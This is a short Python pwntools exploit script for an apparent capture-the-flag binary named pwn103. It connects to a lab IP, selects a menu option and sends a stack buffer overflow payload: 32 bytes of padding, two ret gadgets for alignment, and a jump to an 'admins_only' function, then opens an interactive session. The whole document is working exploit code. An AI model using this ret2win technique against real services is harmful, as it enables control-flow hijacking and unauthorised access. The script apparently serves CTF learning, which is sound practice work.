from pwn import *

elf = context.binary = ELF('./pwn103-1644300337872.pwn103')
context.log_level = 'debug'

io = remote('10.10.251.98', 9003)

io.sendlineafter(b'  Choose the channel: ', '3')


# Offset found using ghidra lmao

offset = 32
ret = 0x401016


# Single ret didnt work, so I added another one :D

payload = flat(
	b'A' * 32,
	ret,
	ret,
	elf.sym['admins_only']
)


io.sendlineafter(b'------[pwner]: ', payload)
io.interactive()